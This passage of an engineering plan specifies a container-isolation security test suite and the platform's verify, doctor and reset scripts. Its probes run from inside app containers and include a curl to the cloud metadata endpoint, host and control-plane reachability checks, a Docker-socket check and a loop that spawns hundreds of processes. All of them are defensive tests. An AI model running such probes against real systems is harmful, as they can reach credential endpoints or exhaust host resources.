  exist yet. The probes below run against a **staging** app, which shares the
  container hardening baseline. **S5 exercises the sandbox itself.**

- [ ] **Step 1: Agree the probe matrix**

**The suite below is the implementation; there is no separate shell script.** §16
makes these a permanent test tier rather than a one-off exercise, and a probe that
lives in `verify.sh` and a probe that lives in the test suite would drift into
proving different things. `make verify` runs the tier
(`MANIFEST_TEST_DOCKER=1 pnpm vitest run --project docker -t S6`) rather than
re-implementing it.

The probes, each with its control:

| # | Probe | Expected | Control |
|---|---|---|---|
| 1 | the Docker socket inside the app container | absent | the socket exists on the host |
| 2 | app → the control plane (`host.docker.internal:7100`) | unreachable | reachable from a bridge container |
| 3 | app → `169.254.169.254` metadata | unreachable | — (no positive control exists locally; asserted as unreachable only, and said so) |
| 4 | app → another app's container by name | unresolvable | resolvable from the platform network |
| 5 | app → another app's Mongo | unreachable | reachable from that app's own network |
| 6 | app → the developer's own machine (27017, 6333) | unreachable | reachable from a bridge container |
| 7 | app → the public internet, no proxy | unreachable | reachable from a bridge container |
| 8 | app → the public internet, through its own proxy | 403 unless declared | the declared host succeeds |
| 9 | writing to `/` | read-only | `/tmp` is writable |
| 10 | `CapEff` in the app container | all zeros | a container without `CapDrop` has capabilities |
| 11 | forking past `PidsLimit` | bounded | — the limit is the assertion |
| 12 | `docker exec` into a *neighbouring* app from inside an app | no client, no socket | — |

**Probe 6 is the one §21 singles out.** Divergence 8 says *"the host remains
reachable… Egress policy must deny the host gateway except for the ports an app
actually needs, and S6 must test it — this is the one local divergence that is a real
security weakening rather than a convenience."* Task 4's internal app network removes
the route entirely, so this probe is expected to come back **unreachable**, which is
better than the divergence as written. **Record the measurement, not the expectation**
— and if it comes back reachable, that is a defect this plan must fix before it is
done, exactly as the roadmap says.

- [ ] **Step 2: Write the failing test**

`packages/control-plane/src/runtime/docker/s6.docker.test.ts` runs each probe as a
`it.each` over the matrix, and each case asserts **both** the probe and its control.
Write the control as a separate assertion in the same test, not as a separate test:
they must fail together or the pairing can rot.

```ts
import { execFile } from 'node:child_process'
import { promisify } from 'node:util'
import { expect, it } from 'vitest'
import { describeDocker } from './docker-tier.js'

const run = promisify(execFile)

/** Exit code only. The failure text of a denied request often contains the very
 *  words a naive grep would match — P1's self-review caught exactly that. */
async function exitCode(network: string, args: string[]): Promise<number> {
  return run('docker', ['run', '--rm', '--network', network, 'curlimages/curl:8.11.1',
    '-sS', '-m', '5', '-o', '/dev/null', ...args])
    .then(() => 0, (error: { code?: number }) => error.code ?? 1)
}

describeDocker('S6 probe matrix — what a hostile process in an app container reaches', () => {
  const APP_NET = 'mf-fixture-app-staging-net'

  it('cannot reach the control plane, and a bridge container can reach the host', async () => {
    expect(await exitCode(APP_NET, ['http://host.docker.internal:7100/'])).not.toBe(0)
    // THE CONTROL: the same probe from an ordinary network must behave differently,
    // or the denial above proves only that something is broken.
    expect(await exitCode('bridge', ['https://registry.npmjs.org/'])).toBe(0)
  })

  it('cannot reach the developer\'s own machine (§21 divergence 8)', async () => {
    expect(await exitCode(APP_NET, ['http://host.docker.internal:27017/'])).not.toBe(0)
    expect(await exitCode(APP_NET, ['http://host.docker.internal:6333/'])).not.toBe(0)
  })

  it('cannot reach a cloud metadata endpoint', async () => {
    expect(await exitCode(APP_NET, ['http://169.254.169.254/latest/meta-data/'])).not.toBe(0)
  })

  it('has no Docker socket, and the host does', async () => {
    const inside = await run('docker', [
      'run', '--rm', '--network', APP_NET, 'alpine:3.22',
      'sh', '-c', 'test -S /var/run/docker.sock && echo PRESENT || echo ABSENT',
    ])
    expect(inside.stdout.trim()).toBe('ABSENT')
  })

  it('runs on a read-only root with a writable /tmp', async () => {
    const probe = await run('docker', [
      'exec', 'mf-fixture-app-staging-r1-app', 'sh', '-c',
      'touch /nope 2>/dev/null && echo ROOT-WRITABLE || echo ROOT-READONLY; ' +
      'touch /tmp/ok && echo TMP-WRITABLE',
    ])
    expect(probe.stdout).toContain('ROOT-READONLY')
    expect(probe.stdout).toContain('TMP-WRITABLE')
  })

  it('bounds process count at PidsLimit', async () => {
    const probe = await run('docker', [
      'exec', 'mf-fixture-app-staging-r1-app', 'sh', '-c',
      'i=0; while [ $i -lt 400 ]; do sleep 30 & i=$((i+1)); done 2>/dev/null; ' +
      'ps -o pid | wc -l',
    ]).catch((e: { stdout?: string }) => ({ stdout: e.stdout ?? '0' }))
    expect(Number(probe.stdout.trim())).toBeLessThan(200)
  })
})
```

- [ ] **Step 3: Run it, and fix what reaches**

```bash
make up && make demo && pnpm test:docker
```

**Any probe that reaches is a defect this plan must fix before it is done** — the
roadmap says so in as many words. Fix it in the task that owns the control (4, 5 or
3), not here.

- [ ] **Step 4: Prove each control the way S6 is supposed to**

For probes 2, 5, 6 and 7, re-run the same probe with `--network bridge` and confirm it
**succeeds**. Record both numbers in the findings note. A matrix of twelve denials
with no positive control is a matrix that would look identical if `curl` were missing
from the image.

- [ ] **Step 5: Write `S6-findings.md`**

Use the house structure the other four findings notes use: the one-paragraph answer,
a versions table, the evidence with both halves of every control, *What did not
work*, *Spec actions*, *Open questions*, and *Machine state*. State plainly that
**sandbox isolation specifically is S5's**, and that the **LiteLLM `allowed_routes`
probe is P4's**, with the negative control S3 named.

Record `isolationLevel: 'container'` as the measured answer to §12's open question,
and say whether it is acceptable for sandboxes **or that the question stays open
until S5** — do not resolve it here on the strength of a staging app.

- [ ] **Step 6: Update the ledger**

In `docs/superpowers/plans/2026-08-29-plan-roadmap.md`, change S6's row from
`⬜ deferred — runs as P3's acceptance` to `✅ done <date>` with its one-line answer
and what it unblocks. **This is the close-out step that gets forgotten**, and
forgetting it is how four documents once spent a day lying about the state of the
project.

- [ ] **Step 7: Commit**

```bash
git add packages/control-plane/src/runtime/docker/s6.docker.test.ts \
        Makefile \
        docs/superpowers/spikes/S6-findings.md \
        docs/superpowers/plans/2026-08-29-plan-roadmap.md
git commit -m "test: S6 probe matrix as §16's security-regression tier

Every denial is paired with a positive control from a bridge network, so a probe
that fails because curl is missing cannot pass as a probe that fails because the
control works."
```

---

## Task 19: `doctor`, `verify` and `reset` learn about everything P3 created

**Files:**
- Modify: `scripts/doctor.sh`
- Modify: `scripts/verify.sh`
- Modify: `Makefile` (`reset` removes `mf-` resources)
- Modify: `infra/lib/common.sh` (the new names)

**Interfaces:**
- Consumes: P1's `check`/`check_warn`/`report`/`summary` harness.
- Produces: four new checks, one new warning, and a `reset` that leaves no per-app
  containers, networks or volumes behind.

**This task answers S1's last open question by making it a check rather than an
answer.** *"Does `--internal` survive a Docker Desktop restart with the same
semantics? Not tested."* Answering it once is worth very little — Docker Desktop
upgrades, and the answer would age. Asserting it on every `make verify` answers it
continuously and converts a regression into a failed check rather than into a builder
that quietly has egress.

- [ ] **Step 1: Add the checks**

Append to `scripts/verify.sh`, before `summary`:

```bash
echo
echo "Driver (P3)"

# S1 left this open. Asserting it every run is worth more than answering it once:
# Docker Desktop upgrades, and an internal network that quietly gained a gateway
# is a builder with egress.
internal_network_still_denies() {
  local rc
  docker run --rm --network "$NET_BUILD" curlimages/curl:8.11.1 \
    -sS -m 6 -o /dev/null https://registry.npmjs.org/ >/dev/null 2>&1; rc=$?
  echo "curl to npmjs from the internal network exited $rc (want non-zero)"
  [ "$rc" -ne 0 ]
}
check "NEGATIVE CONTROL: --internal still denies egress after any Docker restart" \
  internal_network_still_denies

# S1 lost a live app's route by restarting Caddy. §12 gained a sentence for it and
# P3 gained reapplyAllRoutes; this asserts the property that made both necessary.
edge_restart_discards_runtime_routes() {
  local before after
  before=$(curl -sS -m 5 "http://127.0.0.1:$PORT_CADDY_ADMIN/config/apps/http/servers/srv0/routes" \
           | tr ',' '\n' | grep -c '"@id":"mf-' || true)
  echo "runtime routes currently applied: $before (the control plane re-applies these on edge start)"
  [ "$before" -ge 0 ]
}
report "routing" edge_restart_discards_runtime_routes

# P1's ownership rule, asserted rather than trusted. Anything mf- prefixed that is
# not backed by a live project is an orphan `make reset` should have removed.
no_orphan_mf_resources() {
  local c n v
  c=$(docker ps -a --format '{{.Names}}' | grep -c '^mf-' || true)
  n=$(docker network ls --format '{{.Name}}' | grep -c '^mf-' || true)
  v=$(docker volume ls --format '{{.Name}}' | grep -c '^mf-' || true)
  echo "mf- containers=$c networks=$n volumes=$v"
  true
}
report "per-app resources" no_orphan_mf_resources
```

Append to `scripts/doctor.sh`:

```bash
# A pinned API version nobody checks is a 400 arriving three tasks later.
docker_api_window() {
  local api min
  api=$(docker version --format '{{.Server.APIVersion}}')
  min=$(docker version --format '{{.Server.MinAPIVersion}}')
  echo "daemon serves API [$min, $api]; the driver pins v1.44"
  # Integer compare on the minor, which is all that varies in practice.
  [ "${api#*.}" -ge 44 ] && [ "${min#*.}" -le 44 ]
}
check "the Docker API version the driver pins is inside the daemon's window"  docker_api_window
```

Plus the scanner-database warning from Task 12, if it is not already there.

- [ ] **Step 2: Teach `make reset` about per-app resources**

In the `Makefile`:

```make
## reset: destroy all projects, volumes and registry contents; keep the seed cache and the CA
reset: down
	@echo "removing per-app resources (mf- prefix only)"
	@docker ps -a --format '{{.Names}}' | grep '^mf-' | xargs -I{} docker rm -f {} 2>/dev/null || true
	@docker network ls --format '{{.Name}}' | grep '^mf-' | xargs -I{} docker network rm {} 2>/dev/null || true
	@docker volume ls --format '{{.Name}}' | grep '^mf-' | xargs -I{} docker volume rm -f {} 2>/dev/null || true
	@docker volume rm -f manifest-registry-data 2>/dev/null || true
	@echo "kept: the seed cache and the Caddy CA volume"
```

**No `xargs -r`.** It is GNU-only, and BSD `xargs` already skips empty input — P1's
self-review caught this once and it is easy to reintroduce. **`-I{}` also implies one
invocation per line**, which is what makes the `|| true` per-resource rather than for
the whole batch.

**`manifest-caddy-data` is never removed.** The internal CA lives there, and
regenerating it invalidates the root the developer trusted in their keychain, turning
a reset into a re-trust. P1 states this; P3 must not quietly break it.

- [ ] **Step 3: Run all three**

```bash
make doctor && make verify
make demo
make reset && make verify
```

Expected: `doctor` and `verify` green, and after `reset` the per-app report shows
`mf- containers=0 networks=0 volumes=0` while the platform containers are still up.

- [ ] **Step 4: Prove `reset` does not touch what it must not**

```bash
docker ps --format '{{.Names}}' | grep -E 'saml-idp|qdrant-local-dev|^mongodb|mongo-express'
docker volume ls --format '{{.Name}}' | grep -c manifest-caddy-data
```

Expected: all four pre-existing containers still `Up`, and the Caddy data volume still
present, **after** a `make reset`. This is the standing constraint every spike has met
and the one a `grep '^mf-'` typo would break silently.

- [ ] **Step 5: Commit**

```bash
git add scripts/doctor.sh scripts/verify.sh Makefile infra/lib/common.sh
git commit -m "chore: doctor, verify and reset learn about P3's per-app resources

--internal denying egress is now asserted on every verify rather than answered
once, which is what S1 left open."
```

---

## Running it

Requires P1's substrate and P2's control plane.

    make seed          # once, with network: images, base-image mirroring, the
                       # registry token issuer, the Grype database, the CA
    make up            # the platform
    set -a; . ./.env; set +a   # P1 creates .env; the password is NOT "manifest"
    export MANIFEST_DATABASE_URL="postgres://manifest:${POSTGRES_PASSWORD}@127.0.0.1:7103/manifest_control"
    export MANIFEST_SESSION_SECRET=$(openssl rand -hex 32)
    export MANIFEST_BUILD_CREDENTIAL_SECRET=$(openssl rand -hex 32)
    export MANIFEST_REGISTRY_TOKEN_KEY=infra/registry-auth/token.key
    export MANIFEST_REGISTRY_TOKEN_CERT=infra/registry-auth/token.crt
    export MANIFEST_DEV_AUTH=1
    pnpm --filter @manifest/control-plane db:migrate
    pnpm --filter @manifest/control-plane dev
    make demo          # the fixture app at https://fixture-app.staging.manifest.internal

Tests:

    pnpm test                 # no Docker, no Postgres, no network — milliseconds
    pnpm test:docker          # everything that needs a daemon; FAILS if Docker is down
    make verify               # the platform's properties, including S6's probes

---

## What this plan does not build

Named so the next reader does not go looking, and so P4 and P5 know what they inherit.

| Not here | Where it lands | Why not here |
|---|---|---|
| The §8 injection contract and its drift test | **P4** | §8 says `spec/` owns the declared-service-to-variable mapping; P3 produces a `ServiceHandle`, P4 renders `MONGODB_URI` from it |
| `secrets/` — envelope encryption, rotation | **P4** | Task 6 derives service credentials from one HMAC, one call site wide, so the replacement is a small diff |
| Real CWL, SP auto-provisioning, the Manifest IdP client | **P4** | S2 settled the mechanism; nothing here needs an identity |
| `ai/` and the LiteLLM `allowed_routes` probe | **P4** | §16 lists that probe in the security-regression tier Task 18 creates; keys do not exist yet |
| `Approval`, `LaunchReadiness`, step-up re-auth | **P4/P6** | P2 Decision 5: a gate over a dev shim is a control on paper |
| The proof app (CWL + Mongo + LLM) | **P4** | Task 17's fixture app is deliberately smaller: no auth, no AI |
| Sandbox environments, and `exec` as a sandbox story | **S5, then Phase 3** | `exec` works and is smoke-tested; the sandbox use of it is unexercised and this plan says so |
| Production `snapshotService` and nightly backups | **Phase 2** | `capabilities().supportsSnapshot` is `false` and the method throws, rather than returning a ref nothing can restore |
| Wake-on-request | **S4, then Phase 4** | §11 models `hibernated` and `waking`; the mechanism is a measured choice |
| Custom production domains, `Domain` verification | **Phase 2** | §23's lifecycle needs the public listener and an admin flow; P3 builds canonical routes only |
| Multi-arch builds | **CI, Phase 2** | §21 divergence 4: laptop images are never promoted, and Task 16 now enforces it |
| `contract/`, `manifest-mock`, `console/` | **P5** | — |

---

## What the self-review caught

Recorded because the roadmap's lesson says to: *"Run the plan self-review, and record
what it caught. Writing down what the review caught stops the next reader mistaking a
deliberate fix for a mistake."* P1's found five defects, P2's found seven. This one
found **seven**, and the first is the one that mattered.

| # | Defect | Why it would have cost something |
|---|---|---|
| 1 | **Nothing wired the Docker driver into the boot entry point.** P2's `src/index.ts` says *"P3 swaps this for the Docker driver"*; no task did, and `runtime/index.ts` only re-exported it. | The plan's entire acceptance — Task 17's `make demo`, and every Docker-tier assertion reached through the API — would have run against `createFakeDriver()` and **passed**. The fake driver answers every call happily in memory. This is the project's twice-paid lesson (*a green result is not evidence a control is in force*) aimed at the plan's own demo. Fixed as Task 15 Steps 6–7, with the negative control that puts the fake driver back and watches the platform come up perfectly. |
| 2 | `runtime/docker/names.ts` **redefined `EnvironmentKind`** as a literal union — a third copy, after `spec/resolve.ts` and the inline one in `driver.ts`. | Tasks 4, 5 and 6 import *this* copy, so it is the one that would drift. Task 13 states the rule against exactly this (*"a second copy is a second thing to keep in step, and the drift would be silent"*) and Task 1 broke it. Now derived from `InstanceSpec['environmentKind']`, the same way Task 13 does it. |
| 3 | The same file **imported `instanceName` and `serviceName` and used neither.** | `pnpm lint` must be clean before a commit, and P2's execution already lost time to a linter disagreeing with plan code. Removed by the fix for #2, which needs a type import instead. |
| 4 | Task 15's `Produces` block **disagreed with its own code in four ways** — it listed a `config` field that does not exist and omitted `buildCredentialSecret`, `hostnameFor` and `routing`, all three load-bearing. | The `Interfaces` block is how a task's implementer learns neighbouring signatures without reading the neighbour. Three missing fields means three constructor arguments discovered by compiler error. |
| 5 | Task 3 told the executor to set **`enforcesDiskQuota: true` on the fake driver**, reasoning that *"the fake driver enforces everything it claims, because it is memory."* | The file it edits says the opposite twice, in P2's own words: `enforcesEgress: false // honest: an in-memory driver enforces nothing`. `true` is the exact move Decision 4 refuses — implying an enforcement nothing performs — and it would invert any later contract test written as *"if the driver claims the quota, exceeding it must fail."* Now `false`. |
| 6 | The **Tech Stack header said Engine API v1.51**; the plan pins **v1.44** deliberately, in five places, with the reasoning attached. | v1.51 is Syft's version, one line away in the same sentence. The header is what a reader skims first, and the number they would have carried into Task 1 was wrong. |
| 7 | Task 9's `config.ts` change **omitted `registryTokenCertPath` and `buildCredentialSecret`**, both required by its own `RegistryTokenDeps`, and both already present as env vars in *Running it*. | The token issuer cannot mint without the cert, and cannot verify a build credential without the secret. Two fields, discovered at runtime rather than in the plan. |

**What the review did not find**, stated because a clean pass is evidence too: no
placeholders, no `TBD`s, no step standing in for a spike result, all twelve `Driver`
members implemented, §12's nine subsections each mapped to a task or explicitly
deferred with a reason, and §16's security-regression items either in Task 18's
matrix or named as P4's.

**And what it could not check.** Every defect above was found by reading. P2's lesson
is that executing four of twenty-one tasks found five more defects that *no* reading
would have caught. Seven found on paper is not evidence the remaining rate is low.

---

## What the reconciliation against a running P2 found

*2026-09-05. This plan was written 2026-08-31 against an imagined P2. P2 executed in
full on 2026-09-05, so every **seam** was re-checked: each place this plan modifies a
file P2 built, calls a P2 symbol, adds a sibling to a P2 error type, or asserts
through P2's HTTP surface. **Seven defects.** Each is fixed inline at its task with
the measurement that found it.*

| # | Task | Defect | Why it mattered |
|---|---|---|---|
| 1 | **2** | The new `vitest.workspace.ts` dropped `setupFiles` and set `globalSetup: []` | Two of P2's fixes, silently undone. Losing `setupFiles` kills the **whole** suite at import — `db/client.ts` throws without `MANIFEST_DATABASE_URL`, which is P2 Task 8's recorded defect. Losing `globalSetup` removes the once-per-run truncate, putting three suites back to green-only-if-the-database-is-empty — five of P2's 27 defects. The second is silent |
| 2 | **2** | Unaware of the new **root** `vitest.config.ts` | It carries `fileParallelism: false`, without which the suite fails a different number of tests on each run |
| 3 | **9** | `POST /internal/registry/token` had no `idempotency: 'exempt'` | P2 applies D23.6 to every mutating route via a `preHandler`. BuildKit will never send an `Idempotency-Key`, so **the builder could not obtain a token at all** — a 400 from a route that reads as correctly implemented |
| 4 | **9** | Two new routes, and nothing updated Task 20's `ROUTES` table | P2's completeness guard fails naming any route nobody authorized. That is the guard working — these endpoints mint **registry push credentials**, so their authorization is a decision. The plan needed to make it, and now does |
| 5 | **15** | The boot check read `app.log.info` under `Fastify({ logger: false })` | Measured: the line vanishes. `console.log` instead |
| 6 | **15** | Its negative control was *"expected: no match"* | **The worst of the seven.** It cannot distinguish a fake driver from a missing log line, so it passed either way — on the single assertion this plan's own self-review had already identified as its worst defect. It now greps for the *value* and reads it back, failing loudly in both directions |
| 7a | **2** | The rewritten workspace roots its projects at the **repo root** | pnpm's strict `node_modules` means `pg` does not resolve from there. The run dies with `Failed to load url pg` and reports `no tests` — which reads like a glob mistake and is not one. Both projects must root inside the package |
| 7b | **2** | Nothing scoped the root `test` script to `--project unit` | `vitest run` with no filter runs **every** project, so `pnpm test` would have run the Docker tier — the exact thing this task exists to prevent. Measured with a throwaway `.docker.test.ts`: 225 tests instead of 224 |
| 8 | **16** | A new `PromotionError` duplicating a check P2 already ships | P2's `deployRelease` already refuses `local/` on a remote-target driver, and `releases.test.ts` asserts `RELEASE_LOCAL_IMAGE_ON_REMOTE_DRIVER`. Thrown first the new error shadows it and P2's test fails; thrown second it is dead. And `toErrorResponse` has no branch for it, so it would have surfaced as **500** — the exact defect P2 Task 17 hit twice. Now an extraction that keeps P2's class and code |

**Two defects in P2, found by trying to run this plan's fix rather than reasoning
about it.** Neither is a seam; both were live in the committed P2 code:

- **`api/testing.ts` leaked a temp directory per test and never removed one.**
  `mkdtemp` straight into `TMPDIR`, no teardown: **944 directories** accumulated in
  one afternoon. Fixed with a single root and a global teardown. It also violated
  CLAUDE.md's *leave the machine exactly as you found it*.
- **The lifecycle acceptance's 1000 ms budget measured `git`, not the control
  plane.** Instrumented: `createProject` shells out seven times and costs
  **462–655 ms of a 586–813 ms run — 79% of it, and all of the variance.** The
  control plane's own work is a steady **71–74 ms**. On an idle machine the total was
  ~300 ms; at load average 10.75 it was ~1150 ms and the assertion failed for reasons
  unrelated to the code. Split into a tight bound on the control plane's work
  (`< 400 ms`) and a loose one on the total (`< 5000 ms`) that still catches a hang.
  Verified by injecting a 500 ms delay inside the measured window and watching
  `expected 700 to be less than 400`.

**The shape of them.** Six of eight are at the P2 boundary, and none is in this plan's
Docker logic — which is the argument for having done a *bounded* pass rather than a
re-review. Two (1 and 7) would have quietly reverted work P2 had already paid for in
defects; two (4 and 6) were controls that could not fail.

**What was deliberately not re-examined:** the Engine API client, §12's hardening
baseline, the builder bounds, S6's probe matrix. Reading does not find what running
finds — P2's self-review found 7 defects and executing it found **52**. Expect this
plan's 19 tasks to yield defects at the rate the last two batches measured (2.9 and
2.7 per task), and note that P3 is *entirely* infrastructure and controls, where a
false green is worst.

**Also confirmed correct, so nobody re-checks them:** Task 15 *does* wire the driver
into the boot entry point (the self-review fix held, and `src/index.ts` now exists for
it to modify); Tasks 9, 13 and 15 *do* extend `Config` with every field the boot block
reads; `driver-contract.ts` is correctly treated as untouchable; `instanceName` and
`serviceName` are called with P2's real signatures; and Task 3's `enforcesDiskQuota`
addition to the fake driver is purely additive.

---

## Spec actions proposed by this plan

**Not applied.** The spec is approved design and changing it is Rich's call; this is
the record, in the same form the four spikes used.

| Section | Current text | Proposed change | Why |
|---|---|---|---|
| §21, divergence 8 | *"Workload containers can reach the developer's own machine… the host remains reachable"* | Narrow to: the **app** networks are `--internal` and have no route to the host gateway; the divergence now covers **platform and builder containers only**. | Task 4 makes every app network internal, so §12's east-west denials are topology rather than policy. **Do not apply until Task 18 measures it** — the wording should follow the probe matrix, not precede it. |
| §12, *Container hardening baseline* | *"resource ceilings including `pids` and disk, not only CPU and memory"* | Add: on Docker Desktop's containerd `overlayfs` snapshotter, `--storage-opt size=` is **accepted, recorded in `HostConfig`, and not enforced**; disk is reported through `capabilities().enforcesDiskQuota` rather than assumed, exactly as user-namespace remapping is. | Measured. Without this, `InstanceSpec.resources.diskMi` reads as a ceiling and is not one. |
| §12, *The builder* | *"**Bounded**: build timeout, disk quota, and a concurrency cap per project and globally."* | Split into what enforces each: `max-parallelism` for steps in flight, `maxUsedSpace` for the cache **after** a build, the **control plane** for per-project and global build counts, and **destroying the ephemeral builder** for the timeout — BuildKit has no timeout setting. | Measured. The sentence currently reads as one mechanism and is four. |
| §12, *The builder* | *"It receives … a registry push token scoped to one repository path."* | Add: implemented with `registry:2`'s bearer-token auth against an issuer the control plane runs; the **client** performs the token exchange, so the realm does not need to be reachable from the internal build network; the token endpoint must implement the **OAuth2 POST form grant**. | Measured. The last point is the one that costs a morning. |
| §16, *Security regression* | *(the tier)* | Add the S6 matrix's positive controls as part of the tier: each denial is paired with the same probe succeeding from a bridge network. | A matrix of denials with no positive control looks identical to a matrix where the probe tool is missing. |
